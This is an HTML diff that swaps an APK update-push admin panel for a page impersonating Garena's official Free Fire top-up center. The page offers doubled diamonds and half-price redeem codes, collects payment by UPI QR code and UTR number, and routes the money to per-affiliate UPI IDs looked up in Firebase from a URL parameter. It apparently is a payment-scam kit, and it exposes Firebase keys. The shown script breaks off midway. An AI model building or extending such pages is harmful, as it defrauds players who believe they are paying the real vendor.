@@ -2,414 +2,680 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FLOW Control Panel</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Garena Topup Center</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
+        :root {
+            --garena-red: #E62129;
+            --bg-gray: #F2F2F2;
+            --card-gray: #F8F8F8;
         }
 
-        body {
-            background-color: #F8FAFC; /* Clean, classic light gray workspace */
-            font-family: 'Inter', sans-serif;
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            font-family: 'Poppins', sans-serif; 
+        }
+
+        body { 
+            background-color: #f0f0f0;
             display: flex;
             justify-content: center;
-            align-items: center;
+        }
+
+        /* Mobile Frame Container */
+        .main-wrapper { 
+            width: 100%;
+            max-width: 480px; 
             min-height: 100vh;
-            padding: 20px;
-        }
-
-        /* Classic Corporate / Elegant Tech Studio Card */
-        .admin-card {
-            background: #FFFFFF;
-            width: 100%;
-            max-width: 440px;
-            border-radius: 16px;
-            padding: 36px 32px;
-            border: 1px solid #E2E8F0;
-            box-shadow: 0px 10px 30px rgba(15, 23, 42, 0.04), 0px 1px 3px rgba(15, 23, 42, 0.02);
+            background: #fff; 
             position: relative;
+            overflow-x: hidden;
         }
 
-        .card-header {
-            text-align: left;
-            margin-bottom: 28px;
-        }
-
-        h2 {
-            color: #0F172A; /* Slate 900 */
-            font-size: 22px;
-            font-weight: 700;
-            letter-spacing: -0.3px;
-        }
-
-        p.subtitle {
-            font-size: 13px;
-            color: #64748B;
-            margin-top: 4px;
-        }
-
-        /* Minimal Status Monitor */
-        .status-monitor {
-            background: #F1F5F9;
-            border-radius: 12px;
-            padding: 14px 18px;
-            margin-bottom: 28px;
-            border: 1px solid #E2E8F0;
-        }
-        
-        .status-title {
-            color: #475569;
-            font-weight: 600;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 8px;
+        /* Fixed Top Bar */
+        .top-bar {
             display: flex;
+            justify-content: space-between;
             align-items: center;
-            gap: 6px;
-        }
-        
-        .status-title .dot {
-            width: 6px;
-            height: 6px;
-            background-color: #10B981; /* Pure crisp green */
-            border-radius: 50%;
-        }
-        
-        .status-val {
-            color: #1E293B;
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 4px;
-            text-overflow: ellipsis;
-            overflow: hidden;
-            white-space: nowrap;
-        }
-        
-        .status-val span {
-            color: #0F172A;
-            font-weight: 600;
+            padding: 10px 15px;
+            background: white;
+            border-bottom: 1px solid #eee;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
         }
 
-        /* Standard Input Layouts */
-        .input-group {
-            margin-bottom: 22px;
-        }
-
-        label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #344054;
-            margin-bottom: 6px;
-        }
-
-        .input-wrapper {
-            position: relative;
+        .logo-sec {
             display: flex;
+            justify-content: space-between;
             align-items: center;
+            padding: 8px 15px;
         }
 
-        .input-wrapper i {
-            position: absolute;
-            left: 14px;
-            color: #94A3B8;
-            font-size: 16px;
-            pointer-events: none;
+        .brand-info { display: flex; align-items: center; gap: 8px; }
+        .brand-info img { width: 22px; height: auto; }
+        .brand-info div p { 
+            font-size: 9px; 
+            font-weight: 800; 
+            color: #888; 
+            text-transform: uppercase; 
+            line-height: 1.1;
+            border-left: 1.5px solid #ddd;
+            padding-left: 5px;
         }
 
-        input[type="text"] {
-            width: 100%;
-            padding: 12px 14px 12px 40px;
-            background-color: #FFFFFF;
-            border: 1px solid #D0D5DD;
+        .banner { width: 100%; }
+        .banner img { width: 100%; height: auto; display: block; }
+
+        .ff-card {
+            margin: 12px 15px;
+            height: 85px;
             border-radius: 10px;
-            color: #1D2939;
-            font-size: 15px;
-            outline: none;
-            font-family: inherit;
-            transition: all 0.2s ease;
-            box-shadow: 0px 1px 2px rgba(16, 24, 40, 0.05);
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #eee;
         }
-
-        input[type="text"]:focus {
-            border-color: #3895E4;
-            box-shadow: 0px 0px 0px 4px rgba(56, 149, 228, 0.12);
+        .ff-card img.bg { width: 100%; height: 100%; object-fit: cover; }
+        .ff-content {
+            position: absolute; inset: 0;
+            display: flex; align-items: center; padding: 0 12px; gap: 10px;
+            background: rgba(0,0,0,0.2);
         }
+        .ff-logo-wrap img { width: 42px; height: 42px; border-radius: 8px; }
+        .ff-details h2 { color: white; font-size: 16px; font-weight: 700; }
+        .secure-tag { font-size: 8px; color: #fff; background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 4px; }
 
-        /* 3D Bevel Button Re-mapped to Classic Theme */
-        .btn-wrapper {
-            margin-top: 30px;
+        .step-container { padding: 10px 15px; }
+        .step-header { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
+        .step-num { 
+            background: var(--garena-red); color: white; 
+            width: 20px; height: 20px; border-radius: 4px;
+            display: flex; justify-content: center; align-items: center; 
+            font-weight: 800; font-size: 12px;
         }
+        .step-header b { font-size: 15px; color: #333; }
 
-        .download-panel-trigger {
-            width: 100%;
-            display: block;
-            outline: none;
-            background: linear-gradient(180deg, #FFFFFF 0%, #F5F9FD 35%, #E3EDF7 100%);
-            border: 1px solid #BCCCDD;
-            color: #1A365D;
-            font-family: 'Inter', sans-serif;
-            font-size: 16px;
-            font-weight: 600;
-            letter-spacing: 0.2px;
-            padding: 13px 0;
-            border-radius: 12px;
-            cursor: pointer;
-            text-align: center;
-            user-select: none;
-            box-shadow: 
-                inset 0px 1.5px 0px 0px #FFFFFF, 
-                0px 4px 10px rgba(162, 184, 209, 0.3), 
-                0px 1px 2px rgba(0, 0, 0, 0.02);
-            transition: all 0.15s ease, transform 0.1s ease;
-        }
-
-        .download-panel-trigger:hover {
-            border-color: #A8BCD1;
-            background: linear-gradient(180deg, #FFFFFF 0%, #EDF4FA 40%, #DCE8F5 100%);
-            box-shadow: 
-                inset 0px 1.5px 0px 0px #FFFFFF, 
-                0px 6px 14px rgba(162, 184, 209, 0.4);
-        }
-
-        .download-panel-trigger:active {
-            transform: scale(0.98);
-            background: linear-gradient(180deg, #E6EFF7 0%, #DFEAF4 100%);
-            border-color: #9BB2C9;
-            box-shadow: 
-                inset 0px 2px 4px rgba(0, 0, 0, 0.06), 
-                inset 0px 1px 1px rgba(0, 0, 0, 0.02);
-        }
-
-        /* ==========================================================================
-           HIGH QUALITY CUSTOM MODAL POPUPS (CSS)
-           ========================================================================== */
-        .modal-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(15, 23, 42, 0.4);
-            backdrop-filter: blur(4px);
-            z-index: 10000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s ease;
-        }
-
-        .modal-overlay.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .custom-popup-card {
-            background: #FFFFFF;
-            width: 100%;
-            max-width: 360px;
-            border-radius: 16px;
-            padding: 28px 24px;
-            text-align: center;
-            box-shadow: 0px 20px 24px -4px rgba(16, 24, 40, 0.1), 0px 8px 8px -4px rgba(16, 24, 40, 0.04);
-            transform: scale(0.9);
-            transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-
-        .modal-overlay.active .custom-popup-card {
-            transform: scale(1);
-        }
-
-        .popup-icon-frame {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 22px;
-            margin: 0 auto 16px auto;
-        }
-
-        /* Error/Warning Popup Variant */
-        .icon-warning {
-            background-color: #FEF3F2;
-            color: #D92D20;
-        }
-
-        /* Success Popup Variant */
-        .icon-success {
-            background-color: #ECFDF5;
-            color: #039855;
-        }
-
-        .popup-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #101828;
-            margin-bottom: 8px;
-        }
-
-        .popup-desc {
-            font-size: 14px;
-            color: #475569;
-            line-height: 1.5;
-            margin-bottom: 24px;
-        }
-
-        .popup-close-btn {
-            width: 100%;
-            padding: 10.5px 0;
-            border: 1px solid #D0D5DD;
-            background: #FFFFFF;
-            color: #344054;
-            font-size: 14px;
-            font-weight: 600;
+        .login-box {
+            background: var(--card-gray);
             border-radius: 8px;
-            cursor: pointer;
-            outline: none;
-            box-shadow: 0px 1px 2px rgba(16, 24, 40, 0.05);
-            transition: background 0.15s;
+            padding: 15px;
+            border: 1px solid #eee;
         }
-        .popup-close-btn:hover {
-            background: #F9FAFB;
+        .input-label { font-size: 11px; font-weight: 700; color: #666; margin-bottom: 5px; display: block; }
+        
+        .input-row { 
+            display: flex; 
+            width: 100%; 
+            height: 42px; 
+            border-radius: 4px;
+            overflow: hidden; 
+            border: 1px solid #ddd;
         }
-        .btn-success-theme {
-            background: #039855;
-            color: white;
+        .input-row input { 
+            flex: 1; 
             border: none;
+            padding: 0 12px; 
+            outline: none; 
+            font-size: 13px;
+            width: 100%;
         }
-        .btn-success-theme:hover {
-            background: #027A48;
+        .input-row button { 
+            background: var(--garena-red); 
+            color: white; 
+            border: none;
+            padding: 0 20px; 
+            font-weight: 700;
+            white-space: nowrap; 
+            cursor: pointer;
         }
+        .input-row button.logout-btn { background: #333; }
+
+        .social-wrap { text-align: center; margin-top: 15px; }
+        .social-wrap p { font-size: 9px; color: #999; font-weight: 700; margin-bottom: 10px; }
+        .icons-row { display: flex; justify-content: center; gap: 12px; }
+        .icon-circle { 
+            width: 32px; height: 32px; border-radius: 50%; border: 1px solid #ddd; 
+            display: flex; justify-content: center; align-items: center; background: #fff;
+        }
+
+        .tab-buttons { display: flex; gap: 8px; padding: 0 15px 10px; }
+        .btn-tab { padding: 5px 15px; border-radius: 15px; font-size: 11px; font-weight: 700; border: 1px solid #eee; cursor: pointer; }
+        .btn-tab.active { border-color: var(--garena-red); color: var(--garena-red); }
+
+        .dm-grid { 
+            display: flex; 
+            flex-direction: column;
+            gap: 10px; 
+            padding: 0 15px 20px; 
+        }
+        .dm-item-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #fff;
+            padding: 10px 12px;
+            border-radius: 8px;
+            border: 1px solid #eee;
+            position: relative;
+            cursor: pointer;
+        }
+        .dm-left { display: flex; align-items: center; gap: 12px; }
+        .dm-left img { width: 25px; height: 25px; }
+        .dm-info b { font-size: 14px; color: #333; }
+        .dm-info b span { color: #FFA500; margin-left: 4px; }
+        .dm-badges { display: flex; gap: 5px; margin-top: 2px; }
+        .badge { font-size: 9px; font-weight: 800; padding: 2px 8px; border-radius: 10px; text-transform: uppercase; }
+        .badge.soldout { background: #F2F2F2; color: #BBB; }
+        .badge.promo { background: #FFF9E6; color: #FFA500; border: 0.5px solid #FFE699; }
+        
+        .price-btn-box {
+            background: #F2F2F2;
+            color: #888;
+            padding: 6px 20px;
+            border-radius: 6px;
+            font-weight: 800;
+            font-size: 13px;
+        }
+        .price-btn-box.active { background: var(--garena-red); color: white; }
+        
+        .best-val-tag {
+            position: absolute;
+            top: -8px;
+            left: 10px;
+            background: #FFD700;
+            color: #000;
+            font-size: 8px;
+            font-weight: 800;
+            padding: 1px 6px;
+            border-radius: 4px;
+        }
+
+        .redeem-section {
+            background: #fff;
+            margin: 0 15px;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #eee;
+            display: none;
+        }
+        .google-header { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
+        .google-header img { width: 30px; }
+        .google-header span { font-weight: 700; font-size: 14px; color: #444; }
+        .redeem-input-wrap { margin-bottom: 15px; }
+        .redeem-input-wrap label { font-size: 11px; font-weight: 700; color: #888; display: block; margin-bottom: 5px; }
+        .redeem-input-wrap input { width: 100%; height: 42px; border: 1px solid #ddd; border-radius: 5px; padding: 0 10px; outline: none; font-size: 14px; }
+        
+        .redeem-btn { width: 100%; height: 42px; background: var(--garena-red); color: white; border: none; border-radius: 5px; font-weight: 700; font-size: 14px; cursor: pointer; }
+        .redeem-note { font-size: 10px; color: #999; margin-top: 10px; line-height: 1.4; }
+
+        .special-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            padding: 0 15px 30px;
+        }
+        .special-box {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: 8px;
+            padding: 10px;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            cursor: pointer;
+        }
+        .special-box img {
+            width: 100%;      
+            height: 70px;     
+            object-fit: cover;  
+            border-radius: 5px;
+        }
+        .special-box p { font-size: 12px; font-weight: 700; color: #333; }
+
+        /* Modals */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); display: none;
+            justify-content: center; align-items: center; z-index: 9999;
+        }
+        .account-details-modal {
+            background: white; width: 90%; max-width: 380px;
+            border-radius: 15px; overflow: hidden; position: relative;
+        }
+        .modal-title {
+            text-align: center; padding: 15px; font-weight: 800;
+            font-size: 18px; border-bottom: 1px solid #f0f0f0;
+        }
+        .modal-content { padding: 20px; }
+        .modal-row {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 15px;
+        }
+        .m-label { font-size: 13px; font-weight: 600; color: #555; }
+        .m-value { font-size: 13px; font-weight: 800; color: #000; display: flex; align-items: center; gap: 8px; }
+        .continue-btn {
+            width: 90%; margin: 0 5% 15px; height: 45px;
+            background: var(--garena-red); color: white; border: none;
+            border-radius: 8px; font-weight: 800; cursor: pointer;
+        }
+
+        /* NEW: Modal Close Button Styling */
+        .close-modal-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 20px;
+            color: #333;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        /* ID Success Animation */
+        .id-success-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.9); z-index: 10000; display: none;
+            flex-direction: column; justify-content: center; align-items: center;
+            text-align: center;
+        }
+        .id-success-overlay i { color: #2E7D32; font-size: 60px; margin-bottom: 15px; animation: bounce 0.5s ease; }
+        @keyframes bounce { 0% { transform: scale(0); } 70% { transform: scale(1.2); } 100% { transform: scale(1); } }
+
+        .qr-area { text-align: center; background: #f9f9f9; padding: 15px; border-radius: 10px; margin-bottom: 15px; }
+        .qr-area img { width: 180px; height: 180px; }
+        .utr-input { width: 100%; height: 45px; border: 1.5px solid #eee; border-radius: 8px; padding: 0 15px; font-weight: 700; margin-bottom: 10px; outline: none; }
+
+        /* History Styling */
+        #history-section { display: none; margin-top: 20px; }
+        .history-card {
+            background: #fff; border: 1px solid #eee; border-radius: 8px;
+            padding: 10px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center;
+        }
+        .h-info b { font-size: 13px; display: block; }
+        .h-info span { font-size: 10px; color: #999; }
+        .status-pill { font-size: 10px; padding: 3px 8px; border-radius: 4px; font-weight: 800; }
+        .status-Pending { background: #FFF4E5; color: #B76E00; }
+        .status-Success { background: #E6F4EA; color: #1E8E3E; }
+        .status-Rejected { background: #FCE8E6; color: #D93025; }
+
     </style>
 </head>
 <body>
 
-    <div class="admin-card">
-        <div class="card-header">
-            <h2>FLOW Application</h2>
-            <p class="subtitle">System update configuration dashboard</p>
-        </div>
+<div class="id-success-overlay" id="idSuccess">
+    <i class="fas fa-check-circle"></i>
+    <b>ID Linked Successfully!</b>
+</div>
 
-        <div class="status-monitor">
-            <div class="status-title"><div class="dot"></div> Live Environment Status</div>
-            <div class="status-val">Current Version: <span id="currentVersion">Loading...</span></div>
-            <div class="status-val" style="margin-bottom: 0;">Target Endpoint: <span id="currentUrl" style="color: #3895E4;">Loading...</span></div>
+<div class="main-wrapper">
+    <div class="logo-sec">
+        <div class="brand-info">
+            <img src="https://uploads.onecompiler.io/44j2xu7ag/44j2xaaeq/Picsart_26-04-01_14-52-00-162.png" alt="Garena">
+            <div><p>Official Top Up</p><p>Center</p></div>
         </div>
-        
-        <div class="input-group">
-            <label for="newVersion">Target Release Version</label>
-            <div class="input-wrapper">
-                <input type="text" id="newVersion" placeholder="e.g. 1.1.8">
-                <i class="fa-solid fa-code-branch"></i>
-            </div>
-        </div>
-        
-        <div class="input-group">
-            <label for="newUrl">Binary/APK Distribution URL</label>
-            <div class="input-wrapper">
-                <input type="text" id="newUrl" placeholder="https://download-provider.com/file.apk">
-                <i class="fa-solid fa-link"></i>
-            </div>
-        </div>
-        
-        <div class="btn-wrapper">
-            <button class="download-panel-trigger" onclick="updateData()">PUSH UPDATE DATA</button>
+        <div id="user-head" style="width:30px; height:30px; background:#f0f0f0; border-radius:50%; display:flex; justify-content:center; align-items:center; color:#ccc;">
+            <i class="fas fa-user"></i>
         </div>
     </div>
 
+    <div class="banner">
+        <img src="https://uploads.onecompiler.io/44eaxx4gy/44j2xaaeq/Picsart_26-04-01_14-13-17-797.jpg">
+    </div>
 
-    <div id="warningModal" class="modal-overlay">
-        <div class="custom-popup-card">
-            <div class="popup-icon-frame icon-warning">
-                <i class="fa-solid fa-triangle-exclamation"></i>
-            </div>
-            <div class="popup-title">Attention Required</div>
-            <div class="popup-desc">Please supply data for both the Target Version and Distribution URL fields before pushing deployment changes.</div>
-            <button class="popup-close-btn" onclick="closeModal('warningModal')">Go Back</button>
+    <div class="ff-card">
+        <img src="https://uploads.onecompiler.io/44j2xu7ag/44j2xaaeq/Picsart_26-04-01_14-49-32-044.jpg" class="bg">
+        <div class="ff-content">
+            <div class="ff-logo-wrap"><img src="https://uploads.onecompiler.io/44j2xu7ag/44j2xaaeq/IMG_20260401_144524_282.jpg"></div>
+            <div class="ff-details"><h2>Free Fire</h2><div class="secure-tag">100% Secure Payment</div></div>
         </div>
     </div>
 
-    <div id="successModal" class="modal-overlay">
-        <div class="custom-popup-card">
-            <div class="popup-icon-frame icon-success">
-                <i class="fa-solid fa-circle-check"></i>
+    <div class="step-container">
+        <div class="step-header"><span class="step-num">1</span><b>Login</b></div>
+        <div class="login-box">
+            <span class="input-label">Player ID <i class="far fa-question-circle"></i></span>
+            <div class="input-row">
+                <input type="number" id="targetUid" placeholder="Please enter player ID here">
+                <button id="loginBtn" onclick="handleLogin()">Login</button>
             </div>
-            <div class="popup-title">Push Successful</div>
-            <div class="popup-desc" id="successDesc">New version changes have been broadcast successfully to all active client installations.</div>
-            <button class="popup-close-btn btn-success-theme" onclick="closeModal('successModal')">Acknowledge</button>
+            
+            <div id="history-section">
+                <p style="font-size:11px; font-weight:800; color:#555; margin: 15px 0 8px;">Order History</p>
+                <div id="history-list">
+                    </div>
+            </div>
+
+            <div class="social-wrap" id="social-login-ui">
+                <p>OR LOGIN WITH YOUR GAME ACCOUNT</p>
+                <div class="icons-row">
+                    <div class="icon-circle" style="color: #1877F2;"><i class="fab fa-facebook-f"></i></div>
+                    <div class="icon-circle"><img src="https://www.google.com/favicon.ico" width="16"></div>
+                    <div class="icon-circle"><img src="https://www.twitter.com/favicon.ico" width="16"></div>
+                    <div class="icon-circle" style="color: #4C75A3;"><i class="fab fa-vk"></i></div>
+                </div>
+            </div>
         </div>
     </div>
 
+    <div class="modal-overlay" id="accountModal">
+        <div class="account-details-modal">
+            <div class="close-modal-btn" onclick="closeAllModals()">&times;</div>
+            <div class="modal-title">Account Details</div>
+            <div class="modal-content">
+                <div class="modal-row"><span class="m-label">Name</span><span class="m-value" id="m-name">---</span></div>
+                <div class="modal-row"><span class="m-label">UID</span><span class="m-value" id="m-uid">---</span></div>
+                <div class="modal-row"><span class="m-label">Level</span><span class="m-value" id="m-level">---</span></div>
+                <div class="modal-row"><span class="m-label">Likes</span><span class="m-value" id="m-likes">---</span></div>
+                <div class="modal-row"><span class="m-label">Guild</span><span class="m-value" id="m-guild">---</span></div>
+            </div>
+            <button class="continue-btn" onclick="confirmIdentity()">CONTINUE</button>
+        </div>
+    </div>
 
-    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
-    
+    <div class="modal-overlay" id="paymentModal">
+        <div class="account-details-modal">
+            <div class="close-modal-btn" onclick="closeAllModals()">&times;</div>
+            <div class="modal-title">Complete Payment</div>
+            <div class="modal-content">
+                <div class="modal-row"><span class="m-label">Product:</span><span class="m-value" id="pay-item">---</span></div>
+                <div class="modal-row"><span class="m-label">Amount:</span><span class="m-value" id="pay-price" style="color:var(--garena-red);">---</span></div>
+                <div class="qr-area">
+                    <p style="font-size:10px; color:#888; margin-bottom:5px;">Scan QR to Pay</p>
+                    <img id="qr-img" src="" alt="QR Code">
+                </div>
+                <span class="input-label">Enter 12 Digit UTR Number</span>
+                <input type="number" class="utr-input" id="utr-box" placeholder="Ex: 4023XXXXXXXX">
+            </div>
+            <button class="continue-btn" onclick="submitPayment()">CONFIRM PAYMENT</button>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="finalModal">
+        <div class="account-details-modal" style="text-align:center; padding:30px 20px;">
+            <div class="close-modal-btn" onclick="closeAllModals()">&times;</div>
+            <i class="fas fa-check-circle" style="font-size:50px; color:#2E7D32; margin-bottom:15px;"></i>
+            <h2 style="font-size:18px; margin-bottom:10px;">Request Submitted!</h2>
+            <p id="success-msg" style="font-size:13px; color:#666; line-height:1.5;">Your payment is being verified...</p>
+            <button class="continue-btn" style="margin-top:20px;" onclick="closeAllModals()">OKAY</button>
+        </div>
+    </div>
+
+    <div class="step-container">
+        <div class="step-header"><span class="step-num">2</span><b>Diamond Top-up</b></div>
+        <div class="tab-buttons">
+            <div class="btn-tab active" onclick="showTab('purchase')">Purchase</div>
+            <div class="btn-tab" onclick="showTab('redeem')">Redeem</div>
+        </div>
+
+        <div id="purchase-grid" class="dm-grid">
+            <div class="dm-item-row" onclick="openPayment('100 + 100 Diamonds', '₹ 80')">
+                <div class="dm-left"><img src="https://uploads.onecompiler.io/44j2xu7ag/44j2xaaeq/IMG_20260401_144524_282.jpg"><div class="dm-info"><b>100 <span>+100</span></b><div class="dm-badges"><span class="badge promo">Available</span></div></div></div>
+                <div class="price-btn-box active">₹ 80</div>
+            </div>
+            <div class="dm-item-row" onclick="openPayment('540 + 540 Diamonds', '₹ 310')">
+                <div class="dm-left"><img src="https://uploads.onecompiler.io/44j2xu7ag/44j2xaaeq/IMG_20260401_144524_282.jpg"><div class="dm-info"><b>540 <span>+540</span></b><div class="dm-badges"><span class="badge promo">Available</span></div></div></div>
+                <div class="price-btn-box active">₹ 310</div>
+            </div>
+            <div class="dm-item-row" onclick="openPayment('1080 + 1080 Diamonds', '₹ 590')">
+                <div class="dm-left"><img src="https://uploads.onecompiler.io/44j2xu7ag/44j2xaaeq/IMG_20260401_144524_282.jpg"><div class="dm-info"><b>1080 <span>+1080</span></b><div class="dm-badges"><span class="badge promo">Available</span></div></div></div>
+                <div class="price-btn-box active">₹ 590</div>
+            </div>
+            <div class="dm-item-row" onclick="openPayment('2220 + 2220 Diamonds', '₹ 1100')">
+                <span class="best-val-tag">BEST VALUE</span>
+                <div class="dm-left"><img src="https://uploads.onecompiler.io/44j2xu7ag/44j2xaaeq/IMG_20260401_144524_282.jpg"><div class="dm-info"><b>2220 <span>+2220</span></b><div class="dm-badges"><span class="badge promo">Available</span></div></div></div>
+                <div class="price-btn-box active">₹ 1100</div>                                  
+           </div>  
+            <div class="dm-item-row" onclick="openPayment('4000 + 4000 Diamonds', '₹ 2100')">
+    <div class="dm-left">
+        <img src="https://uploads.onecompiler.io/44j2xu7ag/44j2xaaeq/IMG_20260401_144524_282.jpg">
+        <div class="dm-info">
+            <b>4000 <span>+4000</span></b>
+            <div class="dm-badges">
+                <span class="badge promo">Available</span>
+            </div>
+        </div>
+    </div>
+    <div class="price-btn-box active">₹ 2100</div>
+</div>
+                            
+        <div class="dm-item-row" onclick="openPayment('5600 + 5600 Diamonds', '₹ 2900')">
+    <div class="dm-left">
+        <img src="https://uploads.onecompiler.io/44j2xu7ag/44j2xaaeq/IMG_20260401_144524_282.jpg">
+        <div class="dm-info">
+            <b>5600 <span>+5600</span></b>
+            <div class="dm-badges">
+                <span class="badge promo">Available</span>
+            </div>
+        </div>
+    </div>
+    <div class="price-btn-box active">₹ 2900</div>
+</div>
+</div>
+
+
+        <div id="redeem-view" class="redeem-section">
+            <div class="google-header"><img src="https://www.googleplay.com/favicon.ico"><span>Google Play Redeem Code</span></div>
+            <div class="redeem-input-wrap"><label>Enter Amount (₹)</label><input type="number" id="redeem-amt" placeholder="e.g. 10, 30, 80, 160"></div>
+            <button class="redeem-btn" onclick="buyRedeem()">Buy Now</button>
+            <p style="text-align: center; color: #E62129; font-weight: 800; font-size: 13px; margin-top: 10px;">🔥 REDEEM CODE 50% OFF (Pay 50rs for 100rs Code) 🔥</p>
+        </div>
+    </div>
+
+    <div class="step-container"><div class="step-header"><span class="step-num">3</span><b>Special Top-up</b></div></div>
+    <div class="special-grid">
+        <div class="special-box" onclick="openPayment('Weekly Lite Membership', '₹ 30')"><img src="https://uploads.onecompiler.io/44j2xu7ag/44j58wqev/Picsart_26-04-02_08-47-00-378.jpg"><p>Weekly Lite</p></div>
+        <div class="special-box" onclick="openPayment('Weekly Membership', '₹ 100')"><img src="https://uploads.onecompiler.io/44j2xu7ag/44j35y52a/fded803e7bc28704c5f853a1a3136b37%20(1).jpg"><p>Weekly</p></div>
+        <div class="special-box" onclick="openPayment('Monthly Membership', '₹ 400')"><img src="https://uploads.onecompiler.io/44j2xu7ag/44j35y52a/Picsart_26-04-01_16-08-42-137.jpg"><p>Monthly</p></div>
+        <div class="special-box" onclick="openPayment('Evo Access 3D', '₹ 50')"><img src="https://uploads.onecompiler.io/44j2xu7ag/44j38859f/Picsart_26-04-01_16-29-12-620.jpg"><p>Evo Access 3D</p></div>
+        <div class="special-box" onclick="openPayment('Evo Access 3D', '₹ 70')"><img src="https://uploads.onecompiler.io/44j2xu7ag/44j38859f/Picsart_26-04-01_16-29-12-620.jpg"><p>Evo Access 7D</p></div>
+        <div class="special-box" onclick="openPayment('Evo Access 3D', '₹ 150')"><img src="https://uploads.onecompiler.io/44j2xu7ag/44j38859f/Picsart_26-04-01_16-29-12-620.jpg"><p>Evo Access 30D</p></div>
+    </div>
+
     <script>
+        // Firebase Config
         const firebaseConfig = {
-            apiKey: "AIzaSyBY4tPdcDfl0C-FRiP3L52PA2WctlziUtM",
-            authDomain: "flowwebsff.firebaseapp.com",
-            databaseURL: "https://flowwebsff-default-rtdb.firebaseio.com",
-            projectId: "flowwebsff",
-            storageBucket: "flowwebsff.firebasestorage.app",
-            messagingSenderId: "693709721624",
-            appId: "1:693709721624:web:e15f6cba7e97288631736d",
-            measurementId: "G-K4HFTBJ56S"
+            apiKey: "AIzaSyBMwxuK9mo7gu3jsVD8L2AiHmI3aBsUvtU",
+            authDomain: "flowturnament.firebaseapp.com",
+            databaseURL: "https://flowturnament-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "flowturnament",
+            storageBucket: "flowturnament.firebasestorage.app",
+            messagingSenderId: "452539677386",
+            appId: "1:452539677386:web:8c6ee975e5446bf1ef1233"
         };
         
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        const database = firebase.database();
 
-        // Sync Database changes dynamically on State Displays
-        db.ref('appConfig').on('value', (snapshot) => {
-            const data = snapshot.val();
-            if(data) {
-                document.getElementById('currentVersion').innerText = data.latestVersion || "Null";
-                document.getElementById('currentUrl').innerText = data.updateUrl || "Null";
+        let LOGGED_IN_UID = null;
+        let LOGGED_IN_NAME = "";
+        
+        // NEW: Dynamic UPI ID Variable Setup
+        let DYNAMIC_UPI_ID = "unavailable@fam"; // Default Backup UPI
+
+        // NEW: URL Query Parameter se 6-digit Path ID read karke database se data fetch karne ka logic
+        function fetchDynamicUpiFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const pathId = urlParams.get('id'); // Looks for ?id=XXXXXX
+
+            if (pathId) {
+                // Firebase Database nodes tree structure me user scan karega
+                database.ref('users').once('value').then((snapshot) => {
+                    if (snapshot.exists()) {
+                        let upiFound = false;
+                        snapshot.forEach((userSnap) => {
+                            // Agar full user UID ka first 6-digits path ID se match ho jaye
+                            if (userSnap.key.substring(0, 6) === pathId) {
+                                const userData = userSnap.val();
+                                if (userData && userData.upiId) {
+                                    DYNAMIC_UPI_ID = userData.upiId;
+                                    upiFound = true;
+                                }
+                            }
+                        });
+                        if (upiFound) {
+                            console.log("Dynamic UPI Loaded Successfully: " + DYNAMIC_UPI_ID);
+                        } else {
+                            console.log("Path ID match not found. Using default backup UPI.");
+                        }
+                    }
+                }).catch((err) => {
+                    console.error("Firebase fetch dynamic upi error: ", err);
+                });
             }
-        });
-
-        // Custom Modal UI Triggers
-        function showModal(modalId) {
-            document.getElementById(modalId).classList.add('active');
         }
 
-        function closeModal(modalId) {
-            document.getElementById(modalId).classList.remove('active');
+        // Initialize dynamic URL fetch immediately on execution load
+        fetchDynamicUpiFromUrl();
+
